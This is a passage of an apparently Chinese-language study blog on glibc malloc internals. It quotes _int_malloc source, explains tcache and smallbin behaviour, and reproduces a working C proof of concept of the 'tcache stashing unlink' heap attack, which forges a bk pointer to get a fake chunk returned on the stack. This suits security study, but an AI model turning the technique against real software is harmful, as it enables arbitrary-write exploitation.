class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<blockquote>
<p>另外一版流程：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Tokameine/article/details/119482061">https://blog.csdn.net/Tokameine/article/details/119482061</a></p>
</blockquote>
<h1 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h1><p>tcache_bins，指针指向chunk + 0x10(fd)，主要由以下代码确定，用fd与 bk指向 key和next</p>
<p>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</p>
<p> /* Mark this chunk as “in the tcache” so the test in _int_free will</p>
<p>   detect a double free. */</p>
<p> e-&gt;key = tcache;</p>
<p> e-&gt;next = tcache-&gt;entries[tc_idx];</p>
<p>其他像fastbins,unsortbins,smallbins,largebins均指向chunk。</p>
<p> calloc()是不走tcache的。无论tcache有无chunk，都会走到_int_malloc()中。</p>
<blockquote>
<p>calloc的分配不从tcache bin里取chunk，calloc会遍历fastbin、small bin、large  bin，如果在tcache bin里，对应的size的bin不为空，则会将这些bin的chunk采用头插法插入到tcache bin里。</p>
<p>calloc不会从tcache bin里取空闲的chunk，而是从fastbin里取，取完后，和malloc一样，如果fastbin里还有剩余的chunk，则全部放到对应的tcache bin里取，采用头插法.</p>
</blockquote>
<p>在_int_malloc()中，tcache有这样一段逻辑：</p>
<blockquote>
<p>设需求的size为n个字节；<br>如果n大小的tcache不满( 小于7 )，并且有2个以上nb大小的freed chunk 在smallbin中;<br>在_int_malloc(av, n)过程中，会尝试把剩下的n大小的smallbin放到tcache中。</p>
<p>fastbin也会</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes) &#123;</span><br><span class="line">...</span><br><span class="line">	<span class="keyword">if</span> (in_smallbin_range (nb)) &#123;</span><br><span class="line">	...</span><br><span class="line">	    <span class="keyword">if</span> ((victim = last (bin)) != bin) &#123;</span><br><span class="line">	    ...</span><br><span class="line">	    	 <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">             stash them in the tcache.  */</span></span><br><span class="line">          <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">          <span class="comment">//如果tchace不满</span></span><br><span class="line">          <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123;</span><br><span class="line">              mchunkptr tc_victim;</span><br><span class="line">              <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">              <span class="comment">// tcache不满且smallbin还有剩，则进入循环</span></span><br><span class="line">              <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                     &amp;&amp; (tc_victim = last (bin)) != bin) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>) &#123;</span><br><span class="line">                  <span class="comment">//bk是攻击者控制的，故bck是目标地址附近的内存。这里没有double link check</span></span><br><span class="line">                      bck = tc_victim-&gt;bk;</span><br><span class="line">                      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                      bin-&gt;bk = bck;</span><br><span class="line">                      <span class="comment">// 一个目标地址的写操作</span></span><br><span class="line">                      bck-&gt;fd = bin;</span><br><span class="line">                      tcache_put (tc_victim, tc_idx);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="tcache-smashing-unlink"><a href="#tcache-smashing-unlink" class="headerlink" title="tcache_smashing_unlink"></a>tcache_smashing_unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//每一个8字节</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var起始地址：%p\n&quot;</span>,stack_var);</span><br><span class="line">    <span class="comment">//stack_var起始地址：0x7fffffffde10</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;首先，让我们为 fake _ chunk-&gt; bk 写一个可写地址，以绕过 glibc 中的 bck-&gt; fd = bin。这里我们选择 stack _ var [2]作为假 bk。之后我们可以看到 * (fake _ chunk-&gt; bk + 0x10) ，它是 stack _ var [4] ，在攻击之后是 libc addr。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">//You can see the value of fake_chunk-&gt;bk is:0x7fffffffde20</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="comment">//Also, let&#x27;s see the initial value of stack_var[4]:(nil)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;<span class="comment">//free 2 4-9 避免相邻物理块在unsortedbin中合并。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line">    <span class="comment">//由unsortedbin变成了smallbin，因为没有这个大小的chunk所以进行合并，但是他们在unsortedbin中的物理位置还不相邻于是只能把unsortedbin放入smallbin，大小都是0xa0这个大小，包括头部，依然不够用户的需求。这个大小包含在smallbin的大小中，发现smallbin没有可用的chunk于是调用consolidate函数对fastbin进行合并，但是这里fastbin为空于是失败，接着进行对unsortedbin判断，如果有一个chunk够大能够切割分配，也分配，但是大小不够，所以也失败。于是开始便利unsortedbin，如果有chunk与当前所需大小一致分配，但是都比0xa0小，所以失败。到这一步，会把当前遍历的chunk放入smallbin或者largebin中合适的位置（根据大小），遍历完了发现没有刚好匹配的chunk，就去看比当前bin索引大的smallbin或者largebin中有没有空闲chunk来分配，但在这里没有，于是尝试从topchunk分配，可以从动态调试中看到，topchunk变小了。所以最新的chunk的来源是topchunk，而且unsortedbin列表中的内容都被整理放入合适大小的smallbin和largebin中。</span></span><br><span class="line">    <span class="comment">//如果topchunk还失败了，此时fastbin中还有chunk，就再进行合并，合并完没有可以分配的，最终会调用sysmallocs函数向系统申请内存。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="comment">//腾出俩tcachebin90的位置</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">在_int_malloc()中，tcache有这样一段逻辑：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&gt; 设需求的size为n个字节；</span></span><br><span class="line"><span class="comment">&gt; 如果n大小的tcache不满( 小于7 )，并且有2个以上n大小的freed chunk 在smallbin中;</span></span><br><span class="line"><span class="comment">&gt; 在_int_malloc(av, n)过程中，会尝试把剩下的n大小的smallbin放到tcache中。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);<span class="comment">//直接进入smallbin申请空间，此时的情况是tcache不满、smallbin有两个freechunk，则会返回给用户一个，另外一个放入tcachebin中.smallbin是先进先出，在还没有calloc的时候small--c70--290--|3d0--de10|把290分配给用户然后因为tachebin不满，所以把这个内容| |甩进tachebin中，于是第一个tache就是我们的栈指针，再进行一个malloc就会把栈指针交付给用户。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>






<h2 id="各个chunk的大小"><a href="#各个chunk的大小" class="headerlink" title="各个chunk的大小"></a>各个chunk的大小</h2><p>tcachebin64位下size范围：0x20-0x410</p>
<p>fastbin最大值128字节–0x80</p>
<p>smallbin：小于1024字节（0x400）的chunk称之为small chunk</p>
<p>largebin：大于等于1024字节（0x400）的chunk称之为large chunk</p>
<h2 id="先进先出？先进后出？"><a href="#先进先出？先进后出？" class="headerlink" title="先进先出？先进后出？"></a>先进先出？先进后出？</h2><p>tcache,largebin,unsorted bin为<em>先进后出</em>,fastbin,<em>smallbin</em>为先进先出</p>
<h2 id="tcache-unlink"><a href="#tcache-unlink" class="headerlink" title="tcache_unlink"></a>tcache_unlink</h2><blockquote>
<p>目的是使用feee破坏全局chunk0_ptr变量来实现任意内存写入。</p>
</blockquote>
<h3 id="谁会产生last-remainder"><a href="#谁会产生last-remainder" class="headerlink" title="谁会产生last remainder?"></a>谁会产生last remainder?</h3><p>top chunk切割不会</p>
<p>在bin中的切割（剩余部分）会产生last remainder 并且会被放入unsorted bin中。</p>
<p>切割 smallbin largebin （不会切割fastbin  ini_malloc()的执行顺序就不允许了）</p>
<p>切割在for大循环中有写出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">         <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="keyword">do</span></span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) 